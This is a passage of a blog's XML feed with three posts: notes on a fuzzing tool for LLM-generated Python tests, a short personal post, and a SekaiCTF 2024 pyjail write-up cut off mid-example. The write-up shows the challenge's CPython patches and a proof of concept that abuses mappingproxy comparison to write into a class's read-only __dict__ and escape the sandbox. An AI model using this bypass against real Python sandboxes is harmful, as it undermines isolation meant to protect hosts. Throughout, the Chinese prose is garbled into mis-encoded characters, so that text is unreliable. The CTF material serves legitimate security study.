class="headerlink" title="class SearchAllCall"></a>class SearchAllCall</h3><p>ç»§æ‰¿è‡ªast.NodeTransformer</p><p>self.call_nodesè·å–æ‰€æœ‰å‡½æ•°è°ƒç”¨ç»“ç‚¹</p><h3 id="class-SearchAllLibCall"><a href="#class-SearchAllLibCall" class="headerlink" title="class SearchAllLibCall"></a>class SearchAllLibCall</h3><p>ç»§æ‰¿è‡ªSearchAllCall</p><p>å¿½ç•¥ä¸€äº›å‡½æ•°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">ignore_calls = [<br>    <span class="hljs-string">&quot;tf.print&quot;</span>,<br>    <span class="hljs-string">&quot;tf.constant&quot;</span>,<br>    <span class="hljs-string">&quot;tf.zeros&quot;</span>,<br>    <span class="hljs-string">&quot;tf.ones&quot;</span> <span class="hljs-string">&quot;tf.shape&quot;</span>,<br>]<br></code></pre></td></tr></table></figure><h3 id="class-UniqueFinder"><a href="#class-UniqueFinder" class="headerlink" title="class UniqueFinder"></a>class UniqueFinder</h3><ul><li><p>call_expæ˜¯apiè°ƒç”¨çš„å®Œæ•´è¡¨è¾¾ï¼Œå¦‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">lib.call(test = <span class="hljs-number">1</span>, <span class="hljs-number">2</span>)<br></code></pre></td></tr></table></figure></li><li><p>api_callåªæ˜¯apiï¼Œå¦‚ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">lib.call<br></code></pre></td></tr></table></figure></li><li><p>unique_callsæ˜¯apiç§ç±»æ•°</p></li><li><p>ex_repeatsæ˜¯apié‡å¤å‡ºç°çš„æ¬¡æ•°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> call_exp <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> self.unique_found_call_exps:<br>    self.unique_found_call_exps[call_exp] = <span class="hljs-number">0</span><br><span class="hljs-comment"># â€¦â€¦</span><br>self.unique_found_call_exps[call_exp] += <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">sum</span>([v - <span class="hljs-number">1</span> <span class="hljs-keyword">for</span> _, v <span class="hljs-keyword">in</span> self.unique_found_call_exps.items()])<br></code></pre></td></tr></table></figure></li></ul><h3 id="class-UseDef"><a href="#class-UseDef" class="headerlink" title="class UseDef"></a>class UseDef</h3><p>ç»§æ‰¿è‡ªast.NodeTransformer</p><ul><li><p>get_use_defï¼š</p><ul><li>visitåªå¤„ç†name</li><li>è®°å½•Loadåˆ°self.uses</li><li>è®°å½•Storeåˆ°self.defs</li></ul><p>useså’Œdefsæ˜¯ä¸¤ä¸ªå­—å…¸ï¼Œkeyæ˜¯è¡Œå·valueæ˜¯idçš„é›†åˆï¼Œè¿”å›usesã€defså’Œidsï¼Œ<em>è™½ç„¶idsæ²¡ç”¨ï¼Œæ¨‚</em></p></li></ul><h2 id="uil-py"><a href="#uil-py" class="headerlink" title="uil.py"></a>uil.py</h2><h3 id="run-cmd"><a href="#run-cmd" class="headerlink" title="run_cmd"></a>run_cmd</h3><p>ä½¿ç”¨subprocess.runæ‰§è¡Œå‘½ä»¤ï¼Œè¾“å‡ºreturncodeã€stderrå’Œstdoutï¼Œç¨‹åºç»“æŸçŠ¶æ€å’Œé”™è¯¯æç¤ºä¿¡æ¯</p><ul><li><p>è¾“å‡ºï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">verbose</span><br>output.returncode: &#123;&#125;<br><span class="hljs-meta prompt_">stdout&gt; </span><span class="language-bash">&#123;&#125;</span><br><span class="hljs-meta prompt_">stderr&gt; </span><span class="language-bash">&#123;&#125;</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">verbose</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">error_msg</span><br>---- returncode=&#123;&#125; ----<br><span class="hljs-meta prompt_">stdout&gt; </span><span class="language-bash">&#123;&#125;</span><br><span class="hljs-meta prompt_">stderr&gt; </span><span class="language-bash">&#123;&#125;</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">error_msg</span><br></code></pre></td></tr></table></figure></li><li><p>ExecutionStatus</p><ul><li>CRASH<ul><li>SIGABRT Triggered</li><li>SIGILL</li><li>SIGTRAP</li><li>SIGFPE</li><li>OOM</li><li>SIGBUS Triggered</li><li>Segmentation Fault Triggered</li></ul></li><li>EXCEPTION</li><li>SUCCESS</li></ul></li></ul><h2 id="astpasses-py"><a href="#astpasses-py" class="headerlink" title="astpasses.py"></a>astpasses.py</h2><h3 id="class-PassRemoveDocstring"><a href="#class-PassRemoveDocstring" class="headerlink" title="class PassRemoveDocstring"></a>class PassRemoveDocstring</h3><p><em>ç»§æ‰¿äº†NodeTransformerWithPrePoståˆä¸ç”¨ç»§æ‰¿äº†ä¸ªå¯‚å¯è„‘å£³æœ‰ç‚¹é—®é¢˜ç¥é‡‘æˆ‘çœ‹äº†åŠå¤©ï¼ï¼ï¼</em></p><p>Moduleé‡Œçš„Docstringå°±æ˜¯bodyé‡Œä¸€ä¸ªåªæœ‰Constçš„Exprï¼Œåˆ äº†å°±è¡Œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">Module(body=[<br>    Expr(value=Constant(value=<span class="hljs-string">&#x27;\ntest\ntesttest\ntesttesttest\n&#x27;</span>)),<br>    <span class="hljs-comment"># â€¦â€¦</span><br>])<br></code></pre></td></tr></table></figure><h2 id="clean-code-py"><a href="#clean-code-py" class="headerlink" title="clean_code.py"></a>clean_code.py</h2><h3 id="dead-code-elim"><a href="#dead-code-elim" class="headerlink" title="_dead_code_elim"></a>_dead_code_elim</h3><ul><li>ä»¥è¡Œå·ä¸ºç»“ç‚¹ï¼Œè¡Œå†…åŒ…å«çš„idsçš„def-useä¸ºè¾¹å»ºç«‹é‚»æ¥çŸ©é˜µ</li><li>ä¿ç•™æ‰€æœ‰æ²¡æœ‰defæˆ–useçš„è¡Œ</li><li>è·³è¿‡å…ˆuseå†defçš„è¡Œ</li><li>dfsæ›´æ–°æ‰€æœ‰ç›®æ ‡è¡Œå¯è¾¾çš„è¡Œå·successorï¼Œä¿ç•™</li><li>dfsæ›´æ–°æ‰€æœ‰å¯è¾¾successorçš„è¡Œå·ï¼Œä¿ç•™</li></ul><h3 id="dead-code-elim-1"><a href="#dead-code-elim-1" class="headerlink" title="dead_code_elim"></a>dead_code_elim</h3><ul><li><p>ä½¿ç”¨UseDefè·å–defsã€useså’Œids</p><p><em>UseDefè§util&#x2F;instrumentor.py</em></p></li><li><p>ä½¿ç”¨SearchCallè·å–callç›®æ ‡apiçš„æ‰€æœ‰ç»“ç‚¹</p><p><em>SearchCallè§util&#x2F;astpasses.py</em></p></li><li><p>è·å–ç›®æ ‡apiå‡ºç°çš„æœ€å°è¡Œå·ä¸ºtarget_line</p></li><li><p>è°ƒç”¨_dead_code_elimåˆ é™¤ä¸èƒ½åˆ°è¾¾ç›®æ ‡è¡Œçš„è¡Œï¼ˆè¿”å›ä¿ç•™è¡Œï¼‰</p></li><li><p>ä¿ç•™ç¼©è¿›è¡Œ</p></li><li><p>å»é™¤æ³¨é‡Š</p></li><li><p>è¿”å›åˆ é™¤æ­»ä»£ç åçš„ä»£ç </p></li></ul>]]></content>
    
    
    <categories>
      
      <category>Fuzz</category>
      
    </categories>
    
    
    <tags>
      
      <tag>fuzz</tag>
      
      <tag>llm</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ç‚«è€€ä¸€ä¸‹æ¼‚äº®èŠ±èŠ±~</title>
    <link href="/2024/12/23/flower/"/>
    <url>/2024/12/23/flower/</url>
    
    <content type="html"><![CDATA[<p>åªæ˜¯æƒ³ç‚«è€€ä¸€ä¸‹å®¤å‹é€çš„æ¼‚äº®èŠ±èŠ±~</p><span id="more"></span><img src="/2024/12/23/flower/flower1.jpg" class title="flower1"><img src="/2024/12/23/flower/flower2.jpg" class title="flower2">]]></content>
    
    
    <categories>
      
      <category>Life</category>
      
    </categories>
    
    
    <tags>
      
      <tag>life</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2024 sekaiCTF Miku Jail wp</title>
    <link href="/2024/08/31/sekai2024jailwp/"/>
    <url>/2024/08/31/sekai2024jailwp/</url>
    
    <content type="html"><![CDATA[<p>è¿™å‡ å¤©åšæ¢¦éƒ½åœ¨æ‰“æ–­ç‚¹è°ƒè¯•æ‹é€»è¾‘â€¦â€¦</p><span id="more"></span><p>miscï¼Ÿpwnï¼ç¬¬ä¸€æ¬¡åšpyjail</p><h1 id="irs-amp-diff"><a href="#irs-amp-diff" class="headerlink" title="irs &amp; diff"></a>irs &amp; diff</h1><ul><li><p>hookäº†auditäº‹ä»¶ï¼Œæåˆ°äº†ä¸€ä¸ªdiceçš„é¢˜</p></li><li><p>ä½†diceé‚£é¢˜ç”¨çš„æ˜¯bytearrayçš„uafï¼Œè¿™é¢˜ç›´æ¥æŠŠfree patchäº†ï¼šï¼‰</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-comment">diff --git a/Modules/_io/bufferedio.c b/Modules/_io/bufferedio.c</span><br><span class="hljs-comment">index e87d04bd07a..c5f940233ba 100644</span><br><span class="hljs-comment">--- a/Modules/_io/bufferedio.c</span><br><span class="hljs-comment">+++ b/Modules/_io/bufferedio.c</span><br><span class="hljs-meta">@@ -416,7 +416,7 @@</span> buffered_dealloc(buffered *self)<br>     if (self-&gt;weakreflist != NULL)<br>         PyObject_ClearWeakRefs((PyObject *)self);<br>     if (self-&gt;buffer) &#123;<br><span class="hljs-deletion">-        PyMem_Free(self-&gt;buffer);</span><br><span class="hljs-addition">+        //PyMem_Free(self-&gt;buffer);</span><br>         self-&gt;buffer = NULL;<br>     &#125;<br>     if (self-&gt;lock) &#123;<br><span class="hljs-meta">@@ -566,7 +566,7 @@</span> _io__Buffered_close_impl(buffered *self)<br>     res = PyObject_CallMethodNoArgs(self-&gt;raw, &amp;_Py_ID(close));<br> <br>     if (self-&gt;buffer) &#123;<br><span class="hljs-deletion">-        PyMem_Free(self-&gt;buffer);</span><br><span class="hljs-addition">+        //PyMem_Free(self-&gt;buffer);</span><br>         self-&gt;buffer = NULL;<br>     &#125;<br> <br><span class="hljs-meta">@@ -798,8 +798,8 @@</span> _buffered_init(buffered *self)<br>             &quot;buffer size must be strictly positive&quot;);<br>         return -1;<br>     &#125;<br><span class="hljs-deletion">-    if (self-&gt;buffer)</span><br><span class="hljs-deletion">-        PyMem_Free(self-&gt;buffer);</span><br><span class="hljs-addition">+    //if (self-&gt;buffer)</span><br><span class="hljs-addition">+    //    PyMem_Free(self-&gt;buffer);</span><br>     self-&gt;buffer = PyMem_Malloc(self-&gt;buffer_size);<br>     if (self-&gt;buffer == NULL) &#123;<br>         PyErr_NoMemory();<br></code></pre></td></tr></table></figure><p><em>åƒæäº†æ‰“awdçš„æˆ‘â€¦â€¦</em></p></li><li><p>è¿˜ç¦äº†ç±»å‹è½¬æ¢ï¼Œè¦æ±‚ç±»å‹å¿…é¡»åŒ¹é…</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-comment">diff --git a/Objects/bytearrayobject.c b/Objects/bytearrayobject.c</span><br><span class="hljs-comment">index 07c20ac6316..21d1036e4a9 100644</span><br><span class="hljs-comment">--- a/Objects/bytearrayobject.c</span><br><span class="hljs-comment">+++ b/Objects/bytearrayobject.c</span><br><span class="hljs-meta">@@ -512,6 +512,11 @@</span> static int<br> bytearray_setslice(PyByteArrayObject *self, Py_ssize_t lo, Py_ssize_t hi,<br>                PyObject *values)<br> &#123;<br><span class="hljs-addition">+    if (!PyList_CheckExact(values) &amp;&amp; !PyLong_CheckExact(values) &amp;&amp; !PyBytes_CheckExact(value</span><br>s))<br><span class="hljs-addition">+    &#123;</span><br><span class="hljs-addition">+        PyErr_SetString(PyExc_TypeError, &quot;nope&quot;);</span><br><span class="hljs-addition">+        return 0;</span><br><span class="hljs-addition">+    &#125;</span><br>     Py_ssize_t needed;<br>     void *bytes;<br>     Py_buffer vbytes;<br><span class="hljs-meta">@@ -561,6 +566,11 @@</span> bytearray_setslice(PyByteArrayObject *self, Py_ssize_t lo, Py_ssize_t hi,<br> static int<br> bytearray_setitem(PyByteArrayObject *self, Py_ssize_t i, PyObject *value)<br> &#123;<br><span class="hljs-addition">+    if (!PyLong_CheckExact(value))</span><br><span class="hljs-addition">+    &#123;</span><br><span class="hljs-addition">+        PyErr_SetString(PyExc_TypeError, &quot;no&quot;);</span><br><span class="hljs-addition">+        return -1;</span><br><span class="hljs-addition">+    &#125;</span><br>     int ival = -1;<br> <br>     // GH-91153: We need to do this *before* the size check, in case value has a<br><span class="hljs-meta">@@ -590,6 +600,16 @@</span> bytearray_setitem(PyByteArrayObject *self, Py_ssize_t i, PyObject *value)<br> static int<br> bytearray_ass_subscript(PyByteArrayObject *self, PyObject *index, PyObject *values)<br> &#123;<br><span class="hljs-addition">+    if (!PyList_CheckExact(values) &amp;&amp; !PyLong_CheckExact(values))</span><br><span class="hljs-addition">+    &#123;</span><br><span class="hljs-addition">+        PyErr_SetString(PyExc_TypeError, &quot;nope&quot;);</span><br><span class="hljs-addition">+        return -1;</span><br><span class="hljs-addition">+    &#125;</span><br><span class="hljs-addition">+    if (!PyLong_CheckExact(index))</span><br><span class="hljs-addition">+    &#123;</span><br><span class="hljs-addition">+        PyErr_SetString(PyExc_TypeError, &quot;nope&quot;);</span><br><span class="hljs-addition">+        return -1;</span><br><span class="hljs-addition">+    &#125;</span><br>     Py_ssize_t start, stop, step, slicelen, needed;<br>     char *buf, *bytes;<br>     buf = PyByteArray_AS_STRING(self);<br></code></pre></td></tr></table></figure></li><li><p><em>åé¢ä¸€ç›´åœ¨æƒ³æ€ä¹ˆç”¨è¿™ä¸ªä¸œè¥¿ï¼Œç»“æœå…¶å®è¿™ä¸ªpatchçš„æ„æ€æ˜¯æŠŠè¿™ç©æ„banäº†o(Tãƒ˜To)</em></p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-comment">diff --git a/Objects/descrobject.c b/Objects/descrobject.c</span><br><span class="hljs-comment">index a6c90e7ac13..36030ad1caa 100644</span><br><span class="hljs-comment">--- a/Objects/descrobject.c</span><br><span class="hljs-comment">+++ b/Objects/descrobject.c</span><br><span class="hljs-meta">@@ -1210,7 +1210,7 @@</span> mappingproxy_traverse(PyObject *self, visitproc visit, void *arg)<br> static PyObject *<br> mappingproxy_richcompare(mappingproxyobject *v, PyObject *w, int op)<br> &#123;<br><span class="hljs-deletion">-    return PyObject_RichCompare(v-&gt;mapping, w, op);</span><br><span class="hljs-addition">+    return PyObject_RichCompare(v, w, op);</span><br> &#125;<br></code></pre></td></tr></table></figure></li></ul><h1 id="ä¸€äº›æ€ç»´è·¯å¾„"><a href="#ä¸€äº›æ€ç»´è·¯å¾„" class="headerlink" title="ä¸€äº›æ€ç»´è·¯å¾„~"></a>ä¸€äº›æ€ç»´è·¯å¾„~</h1><h2 id="MappingProxyType"><a href="#MappingProxyType" class="headerlink" title="MappingProxyType"></a>MappingProxyType</h2><p>é¦–å…ˆï¼Œä¸ºä»€ä¹ˆè¦ban mappingproxy_richcompareï¼Œè¿™ä¸ªmappingproxyæ˜¯ä»€ä¹ˆä¸œè¥¿</p><ul><li><p>é¦–å…ˆçœ‹ä¸€ä¸ªå¸¸è§çš„ä¸œè¥¿ï¼Œdictå­—å…¸</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>test_dict = &#123;<span class="hljs-string">&#x27;test1&#x27;</span>: <span class="hljs-string">&#x27;test1&#x27;</span>, <span class="hljs-string">&#x27;test2&#x27;</span>: <span class="hljs-string">&#x27;test2&#x27;</span>&#125;<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">type</span>(test_dict)<br>&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;dict&#x27;</span>&gt;<br></code></pre></td></tr></table></figure></li><li><p>mappingproxyå’Œdictç±»ä¼¼ï¼Œä¹Ÿå¯ä»¥åŸºäºdictåˆ›å»º</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">from</span> types <span class="hljs-keyword">import</span> MappingProxyType<br><span class="hljs-meta">&gt;&gt;&gt; </span>test_mapping = MappingProxyType(test_dict)<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">type</span>(test_mapping)<br>&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;mappingproxy&#x27;</span>&gt;<br></code></pre></td></tr></table></figure></li><li><p>ä½†å®ƒæ˜¯åªè¯»çš„ï¼Œå°è¯•ä¿®æ”¹ä¼šæŠ¥é”™</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>test_mapping[<span class="hljs-string">&#x27;test1&#x27;</span>]=<span class="hljs-string">&#x27;test&#x27;</span><br>Traceback (most recent call last):<br>  File <span class="hljs-string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="hljs-number">1</span>, <span class="hljs-keyword">in</span> &lt;module&gt;<br>TypeError: <span class="hljs-string">&#x27;mappingproxy&#x27;</span> <span class="hljs-built_in">object</span> does <span class="hljs-keyword">not</span> support item assignment<br></code></pre></td></tr></table></figure></li><li><p>é‚£è¿™ä¸ªç©æ„æœ‰ä»€ä¹ˆç”¨å‘¢ï¼Ÿå¯¹è±¡æœ‰ä¸€ä¸ªå†…ç½®å±æ€§__dict__ï¼Œç”¨äºå­˜å‚¨å¯¹è±¡çš„å±æ€§</p><ul><li><p>classçš„å®ä¾‹çš„__dict__æ˜¯dictç±»å‹çš„ï¼Œå¯ä»¥ä¿®æ”¹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>():<br><span class="hljs-meta">... </span>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br><span class="hljs-meta">... </span>            self.test1=<span class="hljs-string">&#x27;test1&#x27;</span><br><span class="hljs-meta">... </span>            self.test2=<span class="hljs-string">&#x27;test2&#x27;</span><br><span class="hljs-meta">... </span><br><span class="hljs-meta">&gt;&gt;&gt; </span>a = A()<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">type</span>(a.__dict__)<br>&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;dict&#x27;</span>&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span>a.__dict__<br>&#123;<span class="hljs-string">&#x27;test1&#x27;</span>: <span class="hljs-string">&#x27;test1&#x27;</span>, <span class="hljs-string">&#x27;test2&#x27;</span>: <span class="hljs-string">&#x27;test2&#x27;</span>&#125;<br><span class="hljs-meta">&gt;&gt;&gt; </span>a.__dict__[<span class="hljs-string">&#x27;test1&#x27;</span>]=<span class="hljs-string">&#x27;test111&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>a.test1<br><span class="hljs-string">&#x27;test111&#x27;</span><br></code></pre></td></tr></table></figure></li><li><p>classæœ¬èº«çš„__dict__æ˜¯mappingproxyç±»å‹çš„ï¼Œä¸å¯ä¿®æ”¹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">type</span>(A.__dict__)<br>&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;mappingproxy&#x27;</span>&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span>A.__dict__<br>mappingproxy(&#123;<span class="hljs-string">&#x27;__module__&#x27;</span>: <span class="hljs-string">&#x27;__main__&#x27;</span>, <span class="hljs-string">&#x27;__init__&#x27;</span>: &lt;function A.__init__ at <span class="hljs-number">0x7f25181bc540</span>&gt;, <span class="hljs-string">&#x27;__dict__&#x27;</span>: &lt;attribute <span class="hljs-string">&#x27;__dict__&#x27;</span> of <span class="hljs-string">&#x27;A&#x27;</span> objects&gt;, <span class="hljs-string">&#x27;__weakref__&#x27;</span>: &lt;attribute <span class="hljs-string">&#x27;__weakref__&#x27;</span> of <span class="hljs-string">&#x27;A&#x27;</span> objects&gt;, <span class="hljs-string">&#x27;__doc__&#x27;</span>: <span class="hljs-literal">None</span>&#125;)<br><span class="hljs-meta">&gt;&gt;&gt; </span>A.__dict__[<span class="hljs-string">&#x27;__module__&#x27;</span>]=<span class="hljs-string">&#x27;test&#x27;</span><br>Traceback (most recent call last):<br>  File <span class="hljs-string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="hljs-number">1</span>, <span class="hljs-keyword">in</span> &lt;module&gt;<br>TypeError: <span class="hljs-string">&#x27;mappingproxy&#x27;</span> <span class="hljs-built_in">object</span> does <span class="hljs-keyword">not</span> support item assignment<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨mappingproxyçš„__dict__å¯ä»¥ç¦æ­¢ä¿®æ”¹classçš„å±æ€§</p></li></ul></li><li><p>æœ‰ä¸€ä¸ªissueå¯ä»¥ç”¨å®ä¾‹è‡ªå®šä¹‰çš„__eq__æ–¹æ³•ä¿®æ”¹åªè¯»çš„mappingproxy</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># https://bugs.python.org/issue43838</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">class</span> <span class="hljs-title class_">Sneaky</span>:<br><span class="hljs-meta">... </span>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__eq__</span>(<span class="hljs-params">self, other</span>):<br><span class="hljs-meta">... </span>        other[<span class="hljs-string">&#x27;real&#x27;</span>] = <span class="hljs-number">42</span><br><span class="hljs-meta">... </span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">int</span>.__dict__ == Sneaky()<br><span class="hljs-meta">&gt;&gt;&gt; </span>(<span class="hljs-number">1</span>).real<br><span class="hljs-number">42</span><br></code></pre></td></tr></table></figure><p>mappingproxyçš„__eq__è°ƒç”¨çš„å°±æ˜¯mappingproxy_richcompareå‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> PyObject *<br><span class="hljs-title function_">mappingproxy_richcompare</span><span class="hljs-params">(mappingproxyobject *v, PyObject *w, <span class="hljs-type">int</span> op)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> PyObject_RichCompare(v-&gt;mapping, w, op);<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><p>mappingproxy_richcompareä¼šç›´æ¥ä½¿ç”¨v-&gt;mappingç»§ç»­å‘ä¸‹ä¸€å±‚æ¯”è¾ƒ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> types <span class="hljs-keyword">import</span> MappingProxyType<br><br>test_dict = &#123;<span class="hljs-string">&#x27;test1&#x27;</span>: <span class="hljs-string">&#x27;test1&#x27;</span>, <span class="hljs-string">&#x27;test2&#x27;</span>: <span class="hljs-string">&#x27;test2&#x27;</span>&#125;<br>test_mapping = MappingProxyType(test_dict)<br>test_mapping == test_dict<br></code></pre></td></tr></table></figure><p>è¿™é‡Œtest_mappingåŸºäºtest_dictåˆ›å»ºï¼Œé‚£v-&gt;mappingå°±æŒ‡å‘test_dict</p><img src="/2024/08/31/sekai2024jailwp/w_eq_v.png" class title="w_eq_v"></li><li><p>PyObject_RichCompareæ˜¯PyObjecté€šç”¨çš„__eq__å‡½æ•°ï¼Œä¼šç»§ç»­å‘ä¸‹ä¸€å±‚å±‚æ¯”è¾ƒ</p></li><li><p>è¿™æ—¶å€™mappingæŒ‡å‘çš„åŸå§‹å¯¹è±¡å·²ç»æ²¡æœ‰äº†mappingproxyçš„åªè¯»wrap</p></li><li><p>patchä¸è¿›è¡Œmappingçš„å‘ä¸‹æ¯”è¾ƒå°±ä¼šå¯¼è‡´ä¸€ä¸ªæ­»å¾ªç¯â€¦â€¦</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">return</span> PyObject_RichCompare(v, w, op);<br></code></pre></td></tr></table></figure><img src="/2024/08/31/sekai2024jailwp/loop.png" class title="loop"></li><li><p>ä½†å¦ä¸€ä¸ªissueé‡Œä½¿ç”¨__ror__å¯ä»¥è¾¾åˆ°ç›¸åŒçš„æ•ˆæœ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># https://bugs.python.org/issue44596</span><br><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">class</span> <span class="hljs-title class_">SneakyOr</span>:<br><span class="hljs-meta">... </span>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__or__</span>(<span 